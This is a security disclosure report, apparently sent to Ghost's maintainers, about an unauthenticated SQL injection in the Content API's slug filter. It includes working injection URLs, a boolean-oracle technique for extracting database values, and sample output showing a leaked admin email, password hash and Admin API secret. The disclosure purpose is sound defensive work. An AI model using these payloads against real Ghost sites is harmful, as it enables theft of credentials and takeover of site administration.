description: Ghost's Content API input serializer (slugFilterOrder in slug-filter-order.js) builds a raw SQL ORDER BY clause using string template literals containing the unsanitized `filter` query parameter. An attacker with only the public Content API key — which is embedded in the site's HTML as `data-key` — can craft a `filter=...slug:[...]` value on the /ghost/api/content/tags/ endpoint that injects arbitrary SQL. Using a boolean/error-based oracle (json(char(123)) on SQLite, SLEEP on MySQL), the attacker can exfiltrate arbitrary database rows bit-by-bit with no authentication. A working PoC extracts the admin email, bcrypt password hash, and Admin API secret in ~2600 requests; the leaked Admin API secret then grants full administrative control (create admin users, upload themes, manage all content).
reproduction: 1. Load the Ghost front-end and extract the Content API key from the `data-key` attribute in the page source.
2. Call /ghost/api/content/tags/?key=KEY&fields=id,slug&limit=1 to obtain a valid tag ID.

3. Request /ghost/api/content/tags/?key=KEY&filter=id:TAG_ID,slug:[' OR (SELECT CASE WHEN (<cond>) THEN 1 ELSE json(char(123)) END) > 0 OR slug=']&limit=all — a TRUE condition returns tag JSON, a FALSE condition returns a SQLITE_ERROR BadRequestError.

4. Iterate the boolean oracle over subqueries (e.g. SELECT email/password FROM users, SELECT secret FROM api_keys) to extract values character-by-character; on MySQL substitute a time-based distinguisher such as SLEEP().
5. Use the recovered Admin API secret to authenticate to the Admin API and create admin users / upload themes.
technical_details:
Hi,

I am a security researcher at Anthropic. I am using LLMs to find

vulnerabilities in open source software, and have spent a little bit of

time looking at Ghost. I believe I have found a bug that is extremely

serious. While an LLM found this bug initially, I manually validated the

bug myself and wrote this email and also tried to write a patch myself.

The vulnerability is in the slugFilterOrder function in

core/server/api/endpoints/utils/serializers/input/utils/slug-filter-order.js

<https://github.com/TryGhost/Ghost/blob/main/ghost/core/core/server/api/endpoints/utils/serializers/input/utils/slug-filter-order.js>,

which directly takes user input from the filter query parameter and

constructs a raw SQL ORDER BY clause via string template literals.

Unfortunately, this leads to a SQLi that allows anyone to remotely read

arbitrary data from the database. This is distinct from CVE-2026-22596

which was recently filed.

I have a working PoC, attached to this email, that extracts the admin

email, bcrypt password hash, and even the Admin API secrets when running on

the latest Ghost 6. (Note that an attacker with the extracted Admin API

secret can then create admin users, upload themes, and manage all content.)

To reproduce, start by running Ghost locally with Docker:

  docker run -d -p 2368:2368 ghost:latest

This should bring up Ghost version 6.18.2. From here you should be able to

visit

  http://localhost:2368

Inspect the source code and find the data-key, this will look like

  data-key="bd6a3bb3d48a98345e5bc45b5a"

Then figure out a valid tag ID

http://localhost:2368/ghost/api/content/tags/?key=YOUR_KEY&fields=id,slug&limit=1

then visit these two URLs which behave differently and prove the SQLi:

http://localhost:2368/ghost/api/content/tags/?key=YOUR_KEY&filter=id:YOUR_TAG_ID,slug:['

OR (SELECT CASE WHEN (1=1) THEN 1 ELSE json(char(123)) END) > 0 OR

slug=']&limit=all

http://localhost:2368/ghost/api/content/tags/?key=YOUR_KEY&filter=id:YOUR_TAG_ID,slug:['

OR (SELECT CASE WHEN (1=0) THEN 1 ELSE json(char(123)) END) > 0 OR

slug=']&limit=all

The first of these requests will return

{"tags":[{"id":"69917d0f084446000139092c","name":"News","slug":"news","description":null,"feature_image":null,"visibility":"public","og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"meta_title":null,"meta_description":null,"codeinjection_head":null,"codeinjection_foot":null,"canonical_url":null,"accent_color":null,"url":"

http://localhost:2368/tag/news/

"}],"meta":{"pagination":{"page":1,"limit":100,"pages":1,"total":1,"next":null,"prev":null}}}

and the second will return

  {"errors":[{"message":"Request not understood error, cannot list

tags.","context":"Could not understand

request.","type":"BadRequestError","details":null,"property":null,"help":null,"code":"SQLITE_ERROR","id":"16486360-0a45-11f1-99ce-15113e120122","ghostErrorCode":null}]}

The reason this happens is that:

  - In the TRUE condition, the inner CASE returns 1, and json(char(123)) is

never evaluated

  - But in the FALSE condition, the inner CASE hits the ELSE branch, which

evaluates json(char(123)) which is json('{'). That's malformed JSON and so

we get an error.

This can therefore be weaponized to leak arbitrary bits from the server.

For example, I can learn if the login email address has length >10 by

running

http://localhost:2368/ghost/api/content/tags/?key=bd6a3bb3d48a98345e5bc45b5a&filter=id:69917d0f084446000139092c,slug:[%27%20OR%20(SELECT%20CASE%20WHEN%20(length((SELECT%20email%20FROM%20users%20LIMIT%201))%3E10)%20THEN%201%20ELSE%20json(char(123))%20END)%20%3E%200%20OR%20slug%3D%27]&limit=all

On production MySQL you will need to find a different distinguisher; SLEEP

should probably work well.

The complete PoC (this was entirely Claude-generated, but I can confirm it

runs correctly to extract the keys on my machine) attached will run and

give you an output like this:

  RESULTS (2611 requests, all unauthenticated)

    Admin email:      ghost@example.com

    Admin name:       Ghost

    Account status:   inactive

    Bcrypt hash:

 $2a$10$bxMGUVG0Ri01r1Q7aQeUsONwCOGzqRkUkpLJc/qDYCP7.xm5WcSM2

    Admin API secret: ecc977514394124affaf7148d350a4

With this Admin API secret, you can now do very bad things.

Please let me know if you have additional questions; I would be happy to

discuss them over email or get on a call with you.

Thanks,

Nicholas
title: Critical Vulnerability (CVSS 9.1) : SQLi from unauthenticated user; arbitrary DB reads
